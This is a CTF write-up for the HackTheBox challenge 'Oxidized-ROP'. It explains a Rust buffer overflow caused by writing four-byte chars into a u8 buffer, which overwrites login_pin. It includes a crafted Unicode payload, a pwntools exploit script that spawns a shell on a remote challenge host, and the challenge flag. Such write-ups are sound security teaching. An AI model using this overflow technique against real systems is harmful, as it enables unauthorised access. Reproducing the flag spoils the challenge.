---
title: "Oxidized-ROP"
ctf: "HTB"
date: 2026-06-11
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
author: "gluppler"
---

# Oxidized-ROP

## Summary

Rust struct buffer overflow via `char` vs `u8` mismatch: `save_data` writes 4-byte `u32` values per UTF-8 character into a `[u8; 200]` buffer, allowing controlled overwrite of adjacent stack variables including `login_pin`.

## Solution

### Step 1: Understand the vulnerability

`save_data` iterates over `src.chars()` and writes each `char` (4 bytes as a `u32`) into a `[u8; 200]` buffer using `dest_ptr.write(c)`:

```rust
for c in src.chars() {
    dest_ptr.write(c);   // Writes 4 bytes per char!
    dest_ptr = dest_ptr.offset(1);
}
```

The length check uses `.chars().count()` (200 limit), but each char writes **4 bytes** into the u8 buffer. With 103 chars × 4 bytes = 412 bytes written into a 200-byte buffer, we overflow into `submitted` and `login_pin`.

Stack layout:
- `statement[0..199]` → char 0..49
- `submitted` (byte 200) → char 50
- `login_pin` (bytes 408-411) → char 102

### Step 2: Craft the payload

Each char N writes 4 bytes in little-endian at byte offset N×4:
- Char 50 (`U+0100`): LE bytes `00 01 00 00` → byte 200 = 0x00 (submitted)
- Char 102 (`U+01E240` = 123456): LE bytes `40 E2 01 00` → login_pin = 123456

### Step 3: Exploit

Select option 1 (survey), send the crafted payload, then select option 2 (config panel). `PIN_ENTRY_ENABLED` is `false` but `present_config_panel(&login_pin)` is called regardless — it checks `*pin == 123456` and spawns `/bin/sh`.

**Remote timing:** The shell inherits stdin from the parent. Send `sleep(1)` after selecting option 2 so the shell is ready — otherwise commands may be consumed by the menu loop.

```python
from pwn import *
context.log_level = 'info'
REMOTE_HOST = '154.57.164.74'
REMOTE_PORT = 30996

def make_payload():
    return 'A' * 50 + '\u0100' + 'A' * 51 + '\U0001E240'

def exploit(r):
    r.sendlineafter(b'Selection: ', b'1')
    r.sendlineafter(b'(max 200 characters): ', make_payload().encode('utf-8'))
    r.sendlineafter(b'Selection: ', b'2')
    sleep(1)
    r.sendline(b'cat /challenge/flag.txt')
    log.success(f'Flag: {r.recvline().strip().decode()}')

if __name__ == '__main__':
    import sys
    if 'remote' in sys.argv:
        exploit(remote(REMOTE_HOST, REMOTE_PORT))
    else:
        exploit(process('./oxidized-rop'))
```

## Flag

```
HTB{7h3_0r4n63_cr4b_15_74k1n6_0v3r!}
```
